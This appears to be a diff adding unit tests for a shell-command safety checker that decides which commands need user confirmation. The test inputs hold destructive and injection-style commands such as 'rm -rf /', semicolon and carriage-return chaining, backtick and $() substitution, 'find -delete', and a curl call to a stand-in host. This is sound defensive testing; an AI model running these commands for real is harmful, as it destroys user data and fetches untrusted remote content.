@@ -5,6 +5,9 @@ import {
   isAllowed,
   hasDangerousPatterns,
   hasRedirectionOrSubstitution,
+  hasFindAction,
+  stripQuotedArgs,
+  hasQuotedCommandSubstitution,
 } from "../src/command_check.js";
 
 test("isAllowed allows bare ls", () => {
@@ -114,4 +117,114 @@ test("shouldConfirm forces confirmation on command substitution", () => {
 test("shouldConfirm forces confirmation even when the base command is allowed", () => {
   assert.ok(shouldConfirm("git status > /tmp/x"));
   assert.ok(shouldConfirm("pwd | tee /tmp/x"));
+});
+
+test("hasDangerousPatterns detects the semicolon joiner", () => {
+  assert.ok(hasDangerousPatterns("ls -la; rm -rf ~"));
+  assert.equal(hasDangerousPatterns("ls -la"), false);
+});
+
+test("shouldConfirm rejects semicolon-joined commands with a disallowed part", () => {
+  assert.ok(shouldConfirm("ls -la; rm -rf ~"));
+  assert.ok(shouldConfirm("ls;rm"));
+  assert.ok(shouldConfirm("ls 2>/dev/null; rm -rf ~"));
+});
+
+test("shouldConfirm allows semicolon-joined commands when every part is allowed", () => {
+  assert.equal(shouldConfirm("ls; cat package.json"), false);
+  assert.equal(shouldConfirm("pwd; echo hi"), false);
+});
+
+test("hasRedirectionOrSubstitution detects backtick substitution", () => {
+  assert.ok(hasRedirectionOrSubstitution("ls `id`"));
+  assert.equal(hasRedirectionOrSubstitution("ls -la"), false);
+});
+
+test("shouldConfirm rejects backtick command substitution", () => {
+  assert.ok(shouldConfirm("ls `id`"));
+  assert.ok(shouldConfirm("cat `rm -rf /`"));
+});
+
+test("hasFindAction detects destructive find expressions", () => {
+  assert.ok(hasFindAction("find . -delete"));
+  assert.ok(hasFindAction("find -delete"));
+  assert.ok(hasFindAction("find . -exec rm {} +"));
+  assert.ok(hasFindAction("find . -execdir rm {} +"));
+  assert.ok(hasFindAction("find . -ok rm {} \\;"));
+  assert.equal(hasFindAction("find . -name '*.js'"), false);
+  assert.equal(hasFindAction("ls -la"), false);
+});
+
+test("shouldConfirm rejects find with action expressions", () => {
+  assert.ok(shouldConfirm("find . -delete"));
+  assert.ok(shouldConfirm("find . -exec rm {} +"));
+  assert.ok(shouldConfirm("ls && find . -delete"));
+  assert.ok(shouldConfirm("ls; find . -delete"));
+});
+
+test("shouldConfirm allows read-only find", () => {
+  assert.equal(shouldConfirm("find . -name '*.js'"), false);
+  assert.equal(shouldConfirm("find . -name x | head"), false);
+});
+
+test("shouldConfirm rejects carriage-return-separated commands", () => {
+  assert.ok(shouldConfirm("ls\rrm -rf /"));
+});
+
+test("stripQuotedArgs removes single- and double-quoted spans", () => {
+  const r = stripQuotedArgs('find . -name "*.js" && echo \'hi; there\'');
+  assert.ok(r.stripped !== null);
+  assert.deepEqual(r.stripped.replace(/\s+/g, " ").trim(), "find . -name && echo");
+  assert.deepEqual(r.doubleQuoted, ["*.js"]);
+});
+
+test("stripQuotedArgs keeps escaped characters in double quotes", () => {
+  const r = stripQuotedArgs('echo "a\\"b"');
+  assert.ok(r.stripped !== null);
+  assert.deepEqual(r.doubleQuoted, ['a"b']);
+});
+
+test("stripQuotedArgs flags unterminated quotes", () => {
+  assert.equal(stripQuotedArgs("echo 'unterminated").stripped, null);
+  assert.equal(stripQuotedArgs('echo "unterminated').stripped, null);
+});
+
+test("hasQuotedCommandSubstitution detects $() and backticks", () => {
+  assert.ok(hasQuotedCommandSubstitution("$(rm -rf /)"));
+  assert.ok(hasQuotedCommandSubstitution("`id`"));
+  assert.equal(hasQuotedCommandSubstitution("a;b > c"), false);
+});
+
+test("shouldConfirm allows metacharacters inside quoted strings", () => {
+  // Semicolon and > inside quotes are literal data, not operators.
+  assert.equal(shouldConfirm('grep "a;b" file'), false);
+  assert.equal(shouldConfirm('echo "a > b"'), false);
+  assert.equal(shouldConfirm("find . -name \"*.txt\""), false);
+  assert.equal(shouldConfirm('git diff "file with space"'), false);
+});
+
+test("shouldConfirm allows $() inside single quotes (literal)", () => {
+  // Single quotes are fully literal, so no execution happens.
+  assert.equal(shouldConfirm("echo '$(rm -rf /)'"), false);
+  assert.equal(shouldConfirm("find . -name '-delete'"), false);
+});
+
+test("shouldConfirm forces confirmation on $() inside double quotes", () => {
+  assert.ok(shouldConfirm('echo "$(rm -rf /)"'));
+  assert.ok(shouldConfirm('cat "$(curl http://evil.example)"'));
+});
+
+test("shouldConfirm forces confirmation on backticks inside double quotes", () => {
+  assert.ok(shouldConfirm('echo "`id`"'));
+  assert.ok(shouldConfirm('cat "`rm -rf /`"'));
+});
+
+test("shouldConfirm forces confirmation on escaped quotes that stay literal", () => {
+  // "a\"b" is the literal a"b with no substitution.
+  assert.equal(shouldConfirm('echo "a\\"b"'), false);
+});
+
+test("shouldConfirm forces confirmation on unterminated quotes", () => {
+  assert.ok(shouldConfirm("echo 'unterminated"));
+  assert.ok(shouldConfirm('echo "unterminated'));
 });
